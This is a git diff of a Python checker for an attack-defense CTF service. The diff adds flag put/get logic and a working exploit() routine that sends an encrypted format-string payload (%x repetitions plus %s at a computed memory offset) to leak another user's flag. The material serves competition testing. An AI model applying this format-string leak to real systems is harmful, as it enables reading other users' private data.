@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import hashlib
+import json
 import logging
 import os
 import random
@@ -12,14 +13,13 @@ import traceback
 
 OK, CORRUPT, MUMBLE, DOWN, CHECKER_ERROR = 101, 102, 103, 104, 110
 
-SERVICE_PROTO = "http"  # FIXME: change to https!
+SERVICE_PROTO = "http"
 SERVICE_PORT = 9000
 HTTP_TIMEOUT = 10
 PASSWORD_LENGTH = 12
 OAUTH_LOCAL = True  # True if generate locally, False if make request to remote OAuth service
 OAUTH_SERVER_PORT = 8080
 OAUTH_SERVER_HOST = "localhost"
-MAX_SLOTS = 17*30  # keep in sync with init.c!
 
 
 class ProtocolViolationError(Exception):
@@ -41,7 +41,10 @@ def verdict(exit_code, public="", private=""):
 
 
 def info():
-    verdict(OK, "vulns: 1")
+    verdict(OK, "\n".join([
+        "vulns: 1",
+        "public_flag_description: Flag ID is SLOT:USERNAME, flag is plaintext."
+    ]))
 
 
 def assert_no_http_error(response: requests.Response, verdict_on_http_error: int, url: str = None):
@@ -112,12 +115,16 @@ def make_password(flag_id: str, length: int = PASSWORD_LENGTH):
     return "".join(charset[b % len(charset)] for b in digest[:length])
 
 
-def make_meta(flag_id: str):
+def make_long_meta(flag_id: str):
     long_meta = make_password(flag_id + "aa", length=64) + make_password(flag_id + "bb", length=64)
     long_meta = long_meta[:33]
     if len(long_meta) != 33:
         raise ValueError("Invalid meta length: {!r}".format(long_meta))
     return long_meta
+
+
+def make_plaintext(flag: str) -> str:
+    return "Hello, Mr. John Doe! See: " + flag
 
 
 def get_oauth():
@@ -131,14 +138,15 @@ def get_oauth():
     return oauth
 
 
-def encrypt(plaintext, pubkey_hex):
-    logging.info("Encrypting %r with pubkey %r ...", plaintext, pubkey_hex)
+def encrypt(plaintext: bytes, pubkey_hex: str):
+    plaintext_hex = plaintext.hex().upper()
+    logging.info("Encrypting %r (%s) with pubkey %r ...", plaintext, plaintext_hex, pubkey_hex)
     env = os.environ.copy()
     env["LD_LIBRARY_PATH"] = "."
-    proc = subprocess.Popen(["./encrypt", pubkey_hex, plaintext], stdout=subprocess.PIPE, env=env)
+    proc = subprocess.Popen(["./encrypt", pubkey_hex, plaintext_hex], stdout=subprocess.PIPE, env=env)
     stdout, _ = proc.communicate()
     ciphertext = stdout.decode().strip()
-    logging.info("Ciphertext: %r.", ciphertext)
+    logging.info("Ciphertext: %r (length: %d).", ciphertext, len(ciphertext))
     return ciphertext
 
 
@@ -157,53 +165,92 @@ def put(host, flag_id, flag, vuln):
     c.register(username=flag_id, password=make_password(flag_id), token="nonce")
 
     slot, pubkey = c.generate()
-    long_meta = make_meta(flag_id)  # Important to check all 33 chars!
+    long_meta = make_long_meta(flag_id)  # Important to check all 33 chars!
     c.set_meta(long_meta)
 
     remote_meta = c.get_meta()
+    if not remote_meta:
+        verdict(MUMBLE, public="No meta-information returned")
     if remote_meta != long_meta:
-        verdict(MUMBLE, public="Corrupted meta-information")
+        verdict(MUMBLE, public="Meta-information doesn't match")
 
-    plaintext = flag
-    ciphertext = encrypt(flag, pubkey)  # Local encryption
+    c.set_meta(long_meta[8:16])  # So that vuln is not obvious :)
+
+    plaintext = make_plaintext(flag)
+    ciphertext = encrypt(plaintext.encode(), pubkey)  # Local encryption
 
     c.decrypt(ciphertext)
     remote_plaintext = c.get_plaintext()
-    if remote_plaintext != plaintext:
-        verdict(MUMBLE, public="Wrong decryption result")
 
-    verdict(OK, "{}:{}".format(slot, flag_id))  # Slot is helpful for exploitation
+    if flag not in remote_plaintext:
+        verdict(MUMBLE, public="Flag not found")
+    if remote_plaintext != plaintext:
+        verdict(MUMBLE, public="Plaintext was modified")
+
+    json_flag_id = json.dumps({
+        "public_flag_id": "{}:{}".format(slot, flag_id)  # Slot is helpful for exploitation
+    }).replace(" ", "")
+    verdict(OK, json_flag_id)
 
 
 def get(host, flag_id, flag, vuln):
-    slot, flag_id = flag_id.split(":")
+    slot, flag_id = json.loads(flag_id)["public_flag_id"].split(":")
 
     c = Client(host, SERVICE_PORT, get_oauth())
     c.login(username=flag_id, password=make_password(flag_id))
 
+    plaintext = make_plaintext(flag)
     remote_plaintext = c.get_plaintext()
-    if flag != remote_plaintext:
-        verdict(MUMBLE, public="Flag not found in plaintext")
+
+    if flag not in remote_plaintext:
+        verdict(MUMBLE, public="Flag not found")
+    if remote_plaintext != plaintext:
+        verdict(MUMBLE, public="Plaintext was modified")
 
     verdict(OK, "Flag found")
 
 
 def exploit(host, slot):
-    credentials_filename = "sploit.credentials.txt"
+    slot = int(slot)
+
+    credentials_filename = "exploit.credentials.txt"
+    pubkey_filename = "exploit.pubkey.txt"
+    pubkey = None
     c = Client(host, SERVICE_PORT, get_oauth())
     try:
         with open(credentials_filename) as f:
             username, password = f.readline().strip().split(":")
         c.login(username, password)
+        with open(pubkey_filename) as f:
+            pubkey = f.readline().strip()
     except FileNotFoundError:
         username = gen_str(charset=string.ascii_lowercase + string.digits, length=12)
         password = make_password(username)
-        c.register(username, password, get_oauth())
+        c.register(username, password, token="nonce")
         with open(credentials_filename, "w") as f:
             f.writelines([username + ":" + password])
-    c.generate()
-    # c.set_meta(gen_str())
-    raise NotImplementedError()
+    if pubkey is None:
+        _, pubkey = c.generate()
+        with open(pubkey_filename, "w") as f:
+            f.writelines([pubkey])
+        c.set_meta(gen_str(string.digits, 33))  # Length is important! Must be 33.
+
+    slot0_offset = 0x4002f530
+    slot_size = 392
+    plaintext_offset = 4 + 33  # idx(4) + meta(33)
+    read_offset = slot0_offset + slot_size * slot + plaintext_offset
+    read_offset_bytes = read_offset.to_bytes(4, byteorder="big")
+    payload = b"910" + read_offset_bytes + b"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x|%s"
+
+    ciphertext = encrypt(payload, pubkey)
+    c.decrypt(ciphertext)
+    meta = c.get_meta()
+
+    if "|" not in meta:
+        verdict(CHECKER_ERROR, public="Exploit has failed.")
+
+    logging.info("Hacked! Flag: %r", meta.split("|")[1])
+    verdict(OK)
 
 
 def main(args):
@@ -226,7 +273,8 @@ def main(args):
 
     handler, args_count = cmd_mapping[cmd]
     if len(args) != args_count:
-        verdict(CHECKER_ERROR, "Checker error", "Wrong args count for %s" % cmd)
+        verdict(CHECKER_ERROR, "Checker error", "Wrong args count for %s (%d, expected: %d)" %
+                (cmd, len(args), args_count))
 
     try:
         handler(*args)
